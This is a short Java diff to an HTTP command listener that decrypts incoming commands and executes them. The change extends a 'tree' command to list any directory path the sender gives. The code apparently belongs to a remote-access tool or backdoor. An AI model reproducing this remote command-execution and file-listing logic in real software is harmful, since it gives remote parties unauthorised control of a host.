@@ -45,8 +45,8 @@ public class CommandListener extends Thread implements HttpHandler {
             String cmd = as.decryptText(query, privateKey);
             if (cmd.startsWith("!")) {
                 response = executeModule(query);
-            } else if (cmd.equals("tree")) {
-                response = new FileAssert().printDirectoryTree(new File("."));
+            } else if (cmd.startsWith("tree")) {
+                response = new FileAssert().printDirectoryTree(new File(cmd.split(" ")[1]));
             } else {
                 response = executeCommand(query);
             }
